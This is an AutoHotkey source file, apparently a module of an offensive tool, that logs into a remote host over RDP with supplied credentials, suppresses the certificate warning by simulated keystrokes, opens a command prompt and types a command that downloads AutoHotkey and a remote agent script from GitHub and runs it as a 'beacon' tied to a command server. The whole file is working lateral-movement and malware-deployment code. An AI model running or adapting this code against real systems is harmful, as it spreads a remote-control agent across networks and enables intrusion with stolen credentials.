; ============================================================================
; RDP CONNECT MODULE
; ============================================================================
; Connects to remote host via RDP with stored credentials
; ============================================================================

RDPConnect(hostname, username, password, serverIP, domain := "") {
    ; Define full system paths
    rdpFile := A_Temp "\temp.rdp"
    mstscPath := A_WinDir "\System32\mstsc.exe"
    cmdKeyPath := A_WinDir "\System32\cmdkey.exe"

    ; Build RDP content
    rdpSettings := [
        "screen mode id:i:2",
        "use multimon:i:0",
        "desktopwidth:i:1920",
        "desktopheight:i:1080",
        "session bpp:i:32",
        "winposstr:s:0,1,0,0,800,600",
        "compression:i:1",
        "keyboardhook:i:2",
        "audiocapturemode:i:0",
        "videoplaybackmode:i:1",
        "connection type:i:7",
        "networkautodetect:i:1",
        "bandwidthautodetect:i:1",
        "displayconnectionbar:i:1",
        "username:s:" username,
        "full address:s:" hostname,
        "prompt for credentials:i:0",
        "authentication level:i:0"
    ]

    if domain
        rdpSettings.Push("domain:s:" domain)

    rdpContent := ""
    for setting in rdpSettings
        rdpContent .= setting "`n"

    ; Write RDP file
    if FileExist(rdpFile)
        FileDelete(rdpFile)

    FileAppend(rdpContent, rdpFile)

    ; Store creds
    cmdLine := '"' cmdKeyPath '" /generic:"' hostname '" /user:"' username '" /pass:"' password '"'
    RunWait(cmdLine,, "Hide")

    ; Launch RDP
    Run('"' mstscPath '" "' rdpFile '"')

    ; Clean up RDP file after delay
    SetTimer(() => (FileExist(rdpFile) ? FileDelete(rdpFile) : ""), -5000)

    Sleep(500)

    ; bypass insecure notification
    Send("{Left}{Enter}")

    ; Wait for and activate the RDP window
    WinWait("temp - " hostname " - Remote Desktop Connection", ,Timeout := 15000)
    WinActivate("temp - " hostname " - Remote Desktop Connection")
    Sleep(2500)

    ; Send Windows+X, then r for run
    Send("#x")
    Sleep(300)
    Send("r")
    Sleep(500)
    Send("{Backspace}")
    Send("cmd")
    Send("{Enter}")
    Sleep(800)

    ; Deploy beacon on remote host
    Send(Format('{Text}curl -L -o ahk.exe https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe && ahk.exe /silent /installto %USERPROFILE%\AppData\Local\Programs\AutoHotkey && timeout 3 && curl -L -o script.ahk https://raw.githubusercontent.com/CroodSolutions/AutoPwnKey/refs/heads/main/1%20-%20Covert%20Malware%20Delivery%20and%20Ingress%20Tool%20Transfer/AutoPwnKey-agent.ahk && timeout 3 && %USERPROFILE%\AppData\Local\Programs\AutoHotkey\v2\AutoHotkey64.exe script.ahk {}', serverIP))
    Sleep(300)
    Send("{Enter}")
    Sleep(300)
    Send("#{Down}") ; Minimize cmd
    Sleep(10000)

    message := Format("command_output|{}|Module finished execution, check for new agent.", this.agentID)
    response := this.SendMsg(this.serverIP, this.serverPort, message)

    return true
}
